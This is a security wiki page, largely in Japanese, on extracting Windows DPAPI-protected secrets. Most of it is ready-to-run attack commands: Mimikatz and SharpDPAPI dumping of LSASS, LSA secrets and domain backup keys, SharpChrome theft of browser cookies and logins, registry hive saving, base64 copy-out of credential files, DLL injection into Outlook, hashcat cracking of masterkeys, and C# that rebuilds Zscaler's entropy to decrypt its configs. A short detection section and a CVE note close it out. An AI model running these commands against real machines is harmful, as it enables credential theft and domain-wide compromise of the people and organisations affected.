# DPAPI - パスワード抽出

{{#include ../../banners/hacktricks-training.md}}



## DPAPIとは

The Data Protection API (DPAPI) は主に Windows オペレーティングシステム内で、ユーザーまたはシステムのシークレットをエントロピー源として利用し、**非対称秘密鍵の対称暗号化**に用いられます。これにより、開発者は暗号化キーの保護を自分で管理する必要がなく、ユーザーのログオンシークレットから派生したキー（またはシステム暗号化の場合はシステムのドメイン認証シークレット）を使ってデータを暗号化できるため、暗号化処理が簡素化されます。

最も一般的な DPAPI の利用方法は **`CryptProtectData` and `CryptUnprotectData`** 関数を通じてで、これによりアプリケーションは現在ログオンしているプロセスのセッションで安全にデータを暗号化・復号できます。つまり、暗号化されたデータはそれを暗号化したのと同じユーザーまたはシステムでなければ復号できません。

さらに、これらの関数は **`entropy` parameter** も受け取り、暗号化と復号の両方で使用されるため、このパラメータを使って暗号化されたものを復号するには、暗号化時に使用したのと同じエントロピー値を提供する必要があります。

### ユーザーキー生成

DPAPI は各ユーザーごとに一意のキー（**`pre-key`** と呼ばれる）をユーザーの認証情報に基づいて生成します。このキーはユーザーのパスワードやその他の要素から派生し、アルゴリズムはユーザーの種類に依存しますが最終的には SHA1 になります。例えば、ドメインユーザーの場合は **ユーザーの NTLM ハッシュに依存します**。

これは特に重要で、攻撃者がユーザーのパスワードハッシュを入手できれば、次のことが可能になります:

- **そのユーザーのキーで DPAPI によって暗号化された任意のデータを、API に問い合わせることなく復号する**
- オフラインで **パスワードをクラック** して有効な DPAPI キーを生成しようとする

さらに、ユーザーが DPAPI を使ってデータを暗号化するたびに新しい **マスターキー** が生成されます。このマスターキーが実際にデータの暗号化に使用されます。各マスターキーにはそれを識別する **GUID**（Globally Unique Identifier）が付与されます。

マスターキーは **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** ディレクトリに保存されます。ここで `{SID}` はそのユーザーの Security Identifier です。マスターキーはユーザーの **`pre-key`** により暗号化されて保存され、回復用に **ドメインバックアップキー** によっても暗号化されます（同じキーが異なる2つの方法で暗号化されて保存されることになります）。

注意：マスターキーを暗号化するために使用される **ドメインキーはドメインコントローラに存在し変わることはありません**。したがって、攻撃者がドメインコントローラにアクセスできれば、ドメインバックアップキーを取得してドメイン内のすべてのユーザーのマスターキーを復号できます。

暗号化されたブロブは、ヘッダー内にデータを暗号化するために使われた **マスターキーの GUID** を含んでいます。

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

マスターキーを探す:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### マシン／システム鍵の生成

これはマシンがデータを暗号化するために使用するキーです。**DPAPI_SYSTEM LSA secret** に基づいており、これは SYSTEM ユーザーのみがアクセスできる特別なキーです。このキーは、マシンレベルの資格情報やシステム全体のシークレットなど、システム自身がアクセスする必要があるデータを暗号化するために使用されます。

これらのキーは **don't have a domain backup** なので、ローカルでのみアクセス可能である点に注意してください:

- **Mimikatz** は `mimikatz lsadump::secrets` コマンドで LSA secret をダンプしてアクセスできます
- シークレットはレジストリ内に保存されているため、管理者が **modify the DACL permissions to access it** することでアクセス可能になります。レジストリパスは: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- registry hives からのオフライン抽出も可能です。たとえば、ターゲット上で管理者としてハイブを保存して持ち出す:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
その後、分析用ボックスでhivesからDPAPI_SYSTEM LSA secretを抽出し、それを使ってmachine-scope blobs（scheduled task passwords、service credentials、Wi‑Fi profilesなど）を復号します：
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI によって保護されるデータ

個人データとして DPAPI により保護されているものには以下が含まれる:

- Windows の認証情報
- Internet Explorer および Google Chrome のパスワードと自動入力データ
- Outlook や Windows Mail のようなアプリケーションにおけるメールおよび内部 FTP アカウントのパスワード
- 共有フォルダ、リソース、無線ネットワーク、Windows Vault のパスワード（暗号化キーを含む）
- リモートデスクトップ接続、.NET Passport、および各種暗号化・認証用の秘密鍵のパスワード
- Credential Manager で管理されるネットワークパスワードや、CryptProtectData を使用するアプリケーション（Skype、MSN messenger など）内の個人データ
- レジストリ内の暗号化されたブロブ
- ...

システムで保護されるデータには:
- Wi‑Fi パスワード
- スケジュールされたタスクのパスワード
- ...

### マスターキーの抽出オプション

- ユーザーが domain admin privileges を持っている場合、**domain backup key** にアクセスしてドメイン内のすべてのユーザーマスターキーを復号できる:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- ローカル管理者権限があれば、**LSASS メモリにアクセス**して、接続中のすべてのユーザーの DPAPI マスターキー と SYSTEM キーを抽出できます。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSA secret** にアクセスして machine master keys を復号できます:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- ユーザーのpasswordまたはhash NTLMが判明している場合、**ユーザーのmaster keysを直接復号できます**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- ユーザーとしてセッション内にいる場合、DC に対して **backup key to decrypt the master keys using RPC** を要求することが可能です。ローカル管理者でかつユーザーがログオンしている場合、この目的のために **steal his session token** を行うことができます:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vaultの一覧
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 暗号化データへのアクセス

### DPAPI 暗号化データを見つける

一般ユーザーの**保護されたファイル**は次の場所にあります:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記パスで `\Roaming\` を `\Local\` に変更した場合も確認してください。

列挙の例:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) はファイルシステム、レジストリ、および B64 blobs 内の DPAPI 暗号化された blobs を見つけることができます:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
注意: [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（同じリポジトリから）は DPAPI を使用して cookies のような機密データを復号するために使用できます。

#### Chromium/Edge/Electron クイックレシピ (SharpChrome)

- Current user、インタラクティブな saved logins/cookies の復号（user context で実行すると追加キーが user’s Credential Manager から解決されるため、Chrome 127+ の app-bound cookies にも対応します）:
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline analysis — ファイルしかない場合は、まずプロファイルの "Local State" から AES state key を抽出し、それを使って cookie DB を復号します:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/remote triage: DPAPI ドメインバックアップキー (PVK) を所有し、ターゲットホストで admin 権限がある場合:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- ユーザーの DPAPI prekey/credkey (from LSASS) を持っていれば、password cracking をスキップして profile data を直接 decrypt できます:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
注意
- 新しい Chrome/Edge ビルドでは、特定のクッキーを "App-Bound" 暗号化で保存することがあります。これらの特定のクッキーは、追加の App-Bound キーがないとオフラインで復号できません。ターゲットユーザーのコンテキストで SharpChrome を実行すると自動的に取得されます。下記の Chrome セキュリティブログ投稿を参照してください。

### アクセスキーとデータ

- **SharpDPAPI を使用**して、現在のセッションから DPAPI 暗号化されたファイルの資格情報を取得します:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **資格情報を取得する**（暗号化されたデータや guidMasterKey など）。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeysにアクセスする**:

RPCを使用して、**domain backup key**を要求するユーザーのmasterkeyを復号する:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** ツールは、マスターキーの復号化のために以下の引数もサポートします（`/rpc` でドメインのバックアップキーを取得したり、`/password` で平文パスワードを使用したり、`/pvk` で DPAPI ドメインのプライベートキー ファイルを指定したりできる点に注意してください...）：
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey を使用してデータを復号する**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** ツールは `credentials|vaults|rdg|keepass|triage|blob|ps` の復号化に対して、これらの引数もサポートします（`/rpc` を使ってドメインのバックアップキーを取得したり、`/password` で平文パスワードを使用したり、`/pvk` で DPAPI ドメインのプライベートキー ファイルを指定したり、`/unprotect` で現在のユーザーセッションを使用したりできる点に注意してください...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey を直接使用する（パスワード不要）

LSASS をダンプできる場合、Mimikatz はログオンごとの DPAPI キーを露呈することがあり、これを使って平文のパスワードを知らなくてもユーザーの masterkeys を復号できます。この値をツールに直接渡します:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **現在のユーザーセッション**を使用していくつかのデータを復号する:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py を使ったオフライン復号

被害者ユーザーの SID とパスワード（または NT hash）を持っていれば、Impacket の dpapi.py を使用して DPAPI マスターキーや Credential Manager blobs を完全にオフラインで復号できます。

- ディスク上のアーティファクトを特定する:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- ファイル転送ツールが不安定な場合は、ファイルをホスト上で base64 エンコードし、その出力をコピーしてください:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- ユーザーのSIDとpassword/hashを用いてmasterkeyを復号する:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 復号済みの masterkey を使って credential blob を復号する:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
このワークフローは、Windows Credential Manager を使用するアプリによって保存されたドメイン資格情報（例: `*_adm` を含む管理者アカウント）を回復することがよくあります。

---

### オプションのエントロピー（"Third-party entropy"）の扱い

一部のアプリケーションは `CryptProtectData` に追加の **entropy** 値を渡します。この値がなければ、たとえ正しい masterkey が判明していても blob を復号できません。そのため、この方法で保護された資格情報（例: Microsoft Outlook、いくつかの VPN クライアント）を狙う場合は entropy を取得することが不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) は、ターゲットプロセス内の DPAPI 関数にフックを仕掛け、渡された任意のオプション entropy を透過的に記録する user-mode DLL です。`outlook.exe` や `vpnclient.exe` のようなプロセスに対して **DLL-injection** モードで EntropyCapture を実行すると、各 entropy バッファを呼び出し元プロセスと blob にマッピングしたファイルが出力されます。キャプチャした entropy は後で **SharpDPAPI** (`/entropy:`) や **Mimikatz** (`/entropy:<file>`) に渡してデータを復号することができます。
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### masterkeys をオフラインでクラックする (Hashcat & DPAPISnoop)

Microsoft は Windows 10 v1607 (2016) から **context 3** の masterkey フォーマットを導入しました。 `hashcat` v6.2.6 (December 2023) はハッシュモード **22100** (DPAPI masterkey v1 context ), **22101** (context 1) および **22102** (context 3) を追加し、masterkey ファイルから直接ユーザーパスワードを GPU 加速でクラックできるようになりました。攻撃者はそのため、ターゲットシステムと対話することなくワードリスト攻撃やブルートフォース攻撃を実行できます。

`DPAPISnoop` (2024) がこのプロセスを自動化します：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
The tool can also parse Credential and Vault blobs, decrypt them with cracked keys and export cleartext passwords.

### 他のマシンのデータにアクセス

In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. Of course you need to be able to access that machine and in the following example it's supposed that the **ドメインのバックアップ暗号化キーが既知である**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) はLDAPディレクトリからすべてのユーザとコンピュータを抽出し、RPC経由でドメインコントローラのバックアップキーを抽出する処理を自動化するツールです。スクリプトはその後、すべてのコンピュータのIPアドレスを解決し、各コンピュータに対してsmbclientを実行して全ユーザのDPAPI blobsを取得し、ドメインのバックアップキーで一括復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAPから抽出したコンピュータ一覧を使えば、知らなかったサブネットもすべて見つけられます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) はDPAPIで保護されたシークレットを自動でダンプできます。2.x リリースで導入された機能:

* 数百台のホストからの blobs の並列収集
* **context 3** masterkeys の解析と Hashcat との自動連携によるクラッキング統合
* Chrome "App-Bound" 暗号化クッキーのサポート（次節を参照）
* 新しい **`--snapshot`** モードにより、エンドポイントを繰り返しポーリングして新規作成された blobs の差分を取得

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は masterkey/credential/vault ファイル向けの C# パーサで、Hashcat/JtR 形式を出力でき、オプションで自動的にクラッキングを呼び出すこともできます。Windows 11 24H1 までの machine および user の masterkey フォーマットを完全にサポートします。


## 一般的な検出

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` およびその他の DPAPI 関連ディレクトリへのアクセス。
- 特に **C$** や **ADMIN$** のようなネットワーク共有経由でのアクセス。
- LSASS メモリにアクセスしたり masterkeys をダンプするために **Mimikatz**, **SharpDPAPI** などのツールを使用すること。
- イベント **4662**: *An operation was performed on an object* – **`BCKUPKEY`** オブジェクトへのアクセスと相関づけられる可能性があります。
- プロセスが *SeTrustedCredManAccessPrivilege*（Credential Manager）を要求した場合のイベント **4673/4674**。

---
### 2023-2025 の脆弱性とエコシステムの変化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023年11月)。ネットワークアクセスを持つ攻撃者がドメインメンバーを騙して悪意ある DPAPI バックアップキーを取得させ、ユーザの masterkeys を復号できる可能性がありました。2023年11月の累積アップデートで修正済みです — 管理者は DC およびワークステーションが完全にパッチ適用されていることを確認してください。
* **Chrome 127 “App-Bound” cookie encryption** (2024年7月) は従来の DPAPI のみの保護を置き換え、追加のキーをユーザの **Credential Manager** に格納する方式にしました。クッキーのオフライン復号には現在、DPAPI masterkey と **GCM-wrapped app-bound key** の両方が必要です。SharpChrome v2.3 と DonPAPI 2.x はユーザコンテキストで実行すると追加キーを回復できます。


### ケーススタディ: Zscaler Client Connector – SID から導出されたカスタムエントロピー

Zscaler Client Connector は `C:\ProgramData\Zscaler` 配下に複数の設定ファイル（例: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`）を保存します。各ファイルは **DPAPI (Machine scope)** で暗号化されていますが、ベンダはディスクに保存する代わりに実行時に *計算される* **custom entropy** を提供します。

そのエントロピーは2つの要素から再構築されます:

1. `ZSACredentialProvider.dll` に埋め込まれたハードコードされたシークレット。
2. その設定が属する Windows アカウントの **SID**。

DLL によって実装されているアルゴリズムは次と等価です:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
秘密がディスクから読み取れるDLLに埋め込まれているため、**SYSTEM権限を持つ任意のローカル攻撃者は任意のSIDに対するエントロピーを再生成できます**、およびオフラインでblobsを復号できます:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
復号すると、すべての **デバイスのポスチャチェック** とその期待値を含む完全な JSON 構成が得られます — クライアント側のバイパスを試みる際に非常に有用な情報です。

> ヒント: その他の暗号化されたアーティファクト（`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`）は DPAPI を使って**エントロピーなし**（`16` バイトのゼロ）で保護されています。したがって、SYSTEM 権限を取得すれば `ProtectedData.Unprotect` で直接復号できます。

## 参考文献

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
